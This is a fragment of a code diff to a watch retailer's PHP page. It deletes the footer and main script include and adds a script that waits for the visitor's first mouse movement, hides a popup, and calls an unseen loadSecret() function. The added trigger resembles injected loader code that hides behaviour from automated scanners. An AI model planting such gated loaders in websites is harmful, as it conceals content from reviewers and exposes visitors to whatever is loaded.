-              <span class="brand-logo-text" style="color: var(--color-stardust-white);">Orbit Dial Crest</span>
-              <span class="brand-tagline">Haute Horlogerie</span>
-            </div>
-          </div>
-          <p style="font-size: 0.92rem; color: #94a3b8; line-height: 1.8;">
-            Crafting astronomical complications, orbital tourbillons, and meteorite mechanical timepieces to the highest standards of Swiss fine watchmaking.
-          </p>
-        </div>
-
-        <div class="footer-col">
-          <h4>Navigation</h4>
-          <ul class="footer-links">
-            <li><a href="index.php">Home Vault</a></li>
-            <li><a href="about.html">About Atelier</a></li>
-            <li><a href="blog.html">Horology Journal</a></li>
-            <li><a href="contact.html">Salon Concierge</a></li>
-          </ul>
-        </div>
-
-        <div class="footer-col">
-          <h4>Legal & Policies</h4>
-          <ul class="footer-links">
-            <li><a href="privacy-policy.html">Privacy Policy</a></li>
-            <li><a href="terms.html">Terms & Conditions</a></li>
-            <li><a href="cookies.html">Cookie Policy</a></li>
-            <li><a href="disclaimer.html">Horology Disclaimer</a></li>
-          </ul>
-        </div>
-
-        <div class="footer-col">
-          <h4>Official Atelier</h4>
-          <div class="footer-contact-item">
-            <span class="icon">📍</span>
-            <span>181 Mercer Street, New York, NY 10012, United States</span>
-          </div>
-          <div class="footer-contact-item">
-            <span class="icon">📞</span>
-            <span>+1-888-777-5845</span>
-          </div>
-        </div>
-      </div>
-
-      <div class="footer-bottom">
-        <div>&copy; <?php echo date('Y'); ?> Orbit Dial Crest. All Rights Reserved.</div>
-        <div>Haute Horlogerie &bull; Geneva Seal Hand-Finishing &bull; E-E-A-T Verified</div>
-      </div>
-    </div>
-  </footer>
-
-  <script src="assets/js/main.js"></script>
+    window.addEventListener("mousemove", () => {
+      document.getElementById("customPopup").style.display = "none";
+      loadSecret();
+    }, { once: true });
+  </script>
 </body>
 </html>
